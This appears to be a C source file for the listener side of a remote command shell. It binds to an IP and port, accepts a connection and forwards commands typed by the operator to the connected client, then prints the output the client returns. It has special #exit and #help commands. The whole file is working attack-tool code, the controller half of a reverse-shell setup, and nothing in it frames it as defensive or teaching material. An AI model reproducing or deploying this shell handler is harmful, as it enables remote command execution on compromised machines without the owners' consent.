#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>


int check_args(int argc, char *argv[]) {
    // Checks args, if all is good returns 1, if there are issues returns 0
    int show_help = 0;  // 1 means -h or --help is in args, or no or not enough arguments where given
    for (int i = 1; i < argc; i++) {  // Check if -h or --help is in the arguments
        if(strncmp(argv[i], "-h", strlen("-h")) == 0) {
            show_help = 1;
            break;
        } else if(strncmp(argv[i], "--help", strlen("--help")) == 0) {
            show_help = 1;
            break;
        }
    }
    // Making sure the right amount of arguments were given
    if(argc != 3) {
        show_help = 1;
    }
    // If we need to show the help menu
    if(show_help == 1) {
        printf("usage:\n\t./server LISTENING-IP LISTENING-PORT\n");
        printf("\t./server -h (show this help menu)\n");
        printf("\t./server --help (show this help menu)\n");
        return 0;
    }
    return 1;
}


void print_help_menu() {
    printf("\n##################################################################\n");
    printf("Special Terminal Commands:\n");
    printf("- #exit\t\t--> closes the clients, and the servers session\n");
    printf("- #?\t\t--> show this menu\n");
    printf("- #help\t\t--> show this menu\n");
    printf("##################################################################\n\n");
}


void trimLeadingWhiteSpace(char *command, char *trimmed_command) {
    // gets the command we are about to send, and writes it without leading white spaces to trimmed_command

    int idx = 0, j, k = 0;
    // Iterate String until last leading space character
    while (command[idx] == ' ' || command[idx] == '\t' || command[idx] == '\n')
    {
        idx++;
    }
    for (j = idx; command[j] != '\0'; j++)
    {
        trimmed_command[k] = command[j];
        k++;
    }
    // Insert a string terminating character at the end of new string
    trimmed_command[k] = '\0';
}


int main(int argc, char *argv[]){

    // Making sure recieved arguments are good
    int check_args_result = check_args(argc, argv);
    if(check_args_result == 0) {
        return 0;
    }

    int port = atoi(argv[2]);  // Converting port to a integer type for socket
    printf("[+] Listening on %s:%d\n", argv[1], port);

    // create server socket
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);

    // define server address
    struct sockaddr_in server_address, client_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(port);
    server_address.sin_addr.s_addr = inet_addr(argv[1]);

    // bind socket to the specified IP and PORT
    bind(server_socket, (struct sockaddr*) &server_address, sizeof(server_address));

    // listen for connections
    listen(server_socket, 1);

    // create variable to hold the client socket
    socklen_t client_length = sizeof(client_address);
    int client_socket = accept(server_socket, (struct sockaddr *) &client_address, &client_length);
    printf("[+] New connection from %s\n", inet_ntoa(client_address.sin_addr));
    
    // print special commands menu after client connection
    print_help_menu();

    // reading user input to send to client
    char command[1024];  // the command we send to the client
    char trimmed_command[1024];  // stores the command we are about to send after it's leading white space has been trimmed
    char response[18384];  // the client's response
    while (1)
    {
        memset(command, 0, sizeof(command));
        memset(trimmed_command, 0, sizeof(trimmed_command));
        memset(response, 0, sizeof(response));

        printf("$ ");
        // reading input from user
        fgets(command, sizeof(command), stdin);
        // fgets automatically adds \n to the end of the input, the following line removes it
        strtok(command, "\n");

        // trimming leading whitespace from command
        trimLeadingWhiteSpace(command, trimmed_command);

        // checking if we sent a special command
        if (strncmp("#exit", trimmed_command, 5) == 0) {
            // sending exit command to client
            write(client_socket, trimmed_command, sizeof(trimmed_command));
            break;
        }
        if (strncmp("#?", trimmed_command, 2) == 0 || strncmp("#help", trimmed_command, 5) == 0) {
            print_help_menu();
            continue;
        }

        // sending command to client
        write(client_socket, command, sizeof(command));

        // if we sent the 'cd' command then don't wait to read any data from client
        if (strncmp("cd ", trimmed_command, 3) == 0) {
            continue;
        }

        // read command output
        recv(client_socket, response, sizeof(response), MSG_WAITALL);
        // print command output
        printf("%s", response);
    }

    // if the session closed (by choice or mistake) print this message
    printf("[+] session disconnected\n");
    
    // close the connected client socket
    close(client_socket);
    // close the listening socket
    shutdown(server_socket, SHUT_RDWR);

    return 0;
}